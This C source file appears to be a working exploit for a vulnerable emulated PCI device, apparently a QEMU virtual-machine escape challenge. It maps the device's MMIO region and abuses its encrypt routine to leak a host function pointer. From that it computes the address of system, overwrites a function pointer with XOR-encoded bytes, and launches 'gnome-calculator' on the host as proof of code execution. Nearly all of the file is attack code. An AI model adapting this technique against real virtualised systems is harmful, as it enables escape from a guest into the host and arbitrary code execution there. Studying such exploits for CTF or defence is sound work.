/*
* @Author: resery
* @Date:   2020-10-19 11:58:36
* @Last Modified by:   resery
* @Last Modified time: 2020-10-23 20:57:27
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <stdint.h>
#include <sys/types.h>

unsigned char* mmio_mem;

uint32_t table = 0;
uint32_t pba = 0x800;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint8_t value)
{
    *((uint8_t*)(mmio_mem + addr)) = value;
}

uint8_t mmio_read(uint32_t addr)
{
    return *((uint8_t*)(mmio_mem + addr));
}

void set_status(uint32_t value){
    mmio_read(pba+1);
    mmio_write(table,value);
}

void set_mode(uint32_t value){
    set_status(2);
    mmio_write(table,value);
}

void set_crypt_func(){
    set_status(3);
    mmio_write(table,0);
}

void set_key(uint32_t addr,uint8_t value){
    set_status(1);
    mmio_write(pba + addr,value);
}

void set_input(uint32_t addr,uint8_t value){
    set_status(2);
    mmio_write(pba + addr + 0x80,value);
}

void call_enc(){
    set_mode(1);
    set_status(3);
    mmio_read(table);
}

uint8_t leak_output(uint32_t i){
    set_status(3);
    return mmio_read(pba + 0x110 + i);
}

void init(){
    mmio_read(pba+2);
}

int main(){
	int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource4", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("[+] mmio_mem  \t%p\n",mmio_mem);

    set_crypt_func();

    set_key(0,0x41);

    for(int i=0;i < 0x80;i++){
        set_input(i,0x42);
    }
    call_enc();

    uint64_t tmp;
    uint64_t data;
    for(int i=0;i<8;i++){
        tmp = leak_output(0x80+i);
        data += tmp << i*8;
    }

    printf("[+] func_addr  \t0x%" PRIx64 "\n",data);

    uint64_t base_addr = data - 0x8fc21c;
    uint64_t system_plt = base_addr + 0x2A6BB0;

    printf("[+] base_addr  \t0x%" PRIx64 "\n",base_addr);
    printf("[+] system_plt  0x%" PRIx64 "\n",system_plt);

    init();

    uint8_t data1 = (system_plt & 0xFF)^0x11^0x33;
    uint8_t data2 = ((system_plt >> 8) & 0xFF)^0x22^0x11;
    uint8_t data3 = ((system_plt >> 16) & 0xFF)^0x33^0x22;
    uint8_t data4 = ((system_plt >> 24) & 0xFF)^0x11^0x33;
    uint8_t data5 = ((system_plt >> 32) & 0xFF)^0x22^0x11;
    uint8_t data6 = ((system_plt >> 40) & 0xFF)^0x33^0x22;
    uint8_t data7 = 0^0x11^0x33;
    uint8_t data8 = 0^0x22^0x11;

    set_key(0,0x11);
    set_key(1,0x22);
    set_key(2,0x33);

    for(int i=0;i<0x8;i++){
        set_input(i,0x42);
    }
    call_enc();

    set_input(0,data1);
    set_input(1,data2);
    set_input(2,data3);
    set_input(3,data4);
    set_input(4,data5);
    set_input(5,data6);
    set_input(6,data7);
    set_input(7,data8);
    for(int i=0;i<0x78;i++){
        set_input(i+0x8,0x98);
    }
    call_enc();

    char *shellcode = "gnome-calculator\0";
    for(int i=0;i<strlen(shellcode);i++){
        set_key(i,shellcode[i]);
    }
    call_enc();

    return 0;
}